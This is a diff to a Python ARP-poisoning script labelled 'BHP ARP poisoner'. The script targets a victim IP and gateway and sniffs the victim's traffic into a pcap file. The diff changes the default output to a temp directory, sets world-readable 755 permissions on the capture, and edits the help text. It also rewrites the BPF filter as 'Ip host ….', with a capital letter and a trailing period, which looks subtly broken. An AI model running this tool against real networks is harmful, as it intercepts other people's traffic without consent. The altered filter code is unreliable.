@@ -8,6 +8,7 @@ Improvement done:
 - add parameter for output file
 - move output file default path to user home
 - removing get_if_hwaddr and sndrcv from import
+- moving default output to tmp directory and setting 755 permission for linux OS
 
 Improvement to do:
 - display to improve
@@ -27,19 +28,26 @@ def manageArguments() -> argparse.Namespace:
     :return: a parse_args object
     """
     if os.name == 'nt':
-        homePath = os.environ["USERPROFILE"]
+        sourcePath = os.path.join(os.environ["TEMP"], "BHP")
     else:
-        homePath = os.environ["HOME"]
-    defaultFile = os.path.join(homePath, 'packet.pcap')
+        sourcePath = '/tmp/BHP'
+    if not os.path.exists(sourcePath):
+        os.mkdir(sourcePath)
+    defaultFile = os.path.join(sourcePath, 'packet.pcap')
     parser = argparse.ArgumentParser(
         description='BHP ARP poisoner.\n Need root or administrator right.',
         formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog='Example: python3 proxy.py -v 192.168.0.55 -g 192.168.0.254 -n eth0 -o /root/packet.pcap -c 100\n')
+        epilog='Example: python3 arper.py -v 192.168.0.55 -g 192.168.0.254 -n eth0 -o /root/packet.pcap -c 100\n')
     parser.add_argument('-v', '--victim', required=True, help='The victim IP.')
     parser.add_argument('-g', '--gateway', required=True, help='The gateway IP of the victim.')
     parser.add_argument('-n', '--nic', required=True, help='The nic with access to the victim and gateway network.')
-    parser.add_argument('-o', '--output', default=defaultFile, help='The file where packet are saved.')
-    parser.add_argument('-c', '--count', default=200, help='The number of packet to capture.')
+    parser.add_argument(
+        '-o',
+        '--output',
+        default=defaultFile,
+        help=f'The file where packet are saved. Default is {defaultFile}'
+    )
+    parser.add_argument('-c', '--count', default=200, help='The number of packet to capture. Default is 200.')
     return parser.parse_args()
 
 
@@ -111,9 +119,14 @@ class Arper:
     def sniff(self):
         time.sleep(5)
         print(f'Sniffing {self.count} packets.')
-        bpf_filter = f"ip host {self.victim}"
+        bpf_filter = f"Ip host {self.victim}."
         packets = sniff(count=self.count, filter=bpf_filter, iface=self.interface)
         wrpcap(self.file, packets)
+        if os.name == 'nt':
+            print(f'[!!!] You need to change permission on {self.file} before reccaper file.')
+        else:
+            print(f'Setting 755 permission on {self.file}')
+            os.chmod(self.file, 0o755)
         print('Got the packets!')
         self.restore()
         self.poison_thread.terminate()
